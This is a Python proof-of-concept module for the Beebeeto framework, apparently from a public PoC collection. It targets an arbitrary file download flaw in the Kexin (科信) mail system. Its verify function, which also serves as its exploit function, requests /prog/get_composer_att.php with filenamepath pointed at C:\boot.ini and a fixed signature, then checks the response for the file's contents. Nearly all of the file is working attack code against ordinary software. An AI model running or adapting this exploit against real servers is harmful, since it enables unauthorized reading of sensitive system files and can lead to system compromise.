#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0141',
            'name': '科信邮件系统 /prog/get_composer_att.php 任意文件下载漏洞 POC',
            'author': 'warsong',
            'create_date': '2015-09-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '科信邮件系统',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['科信邮件系统漏洞',  '任意文件下载漏洞', 'php'],
            'desc': '''
                    科信邮件系统任意文件下载漏洞导致敏感信息泄漏，可致系统沦陷。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-066892'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = ('%s/prog/get_composer_att.php?att_size=1623&filenamepath'
                      '=C:\boot.ini&maxatt_sign=4bc882e8c4a98ac7a97acd321aad4f'
                      '88&attach_filename=boot.ini') % url
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'boot.ini' in req.content:
            if 'configuration' in req.content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())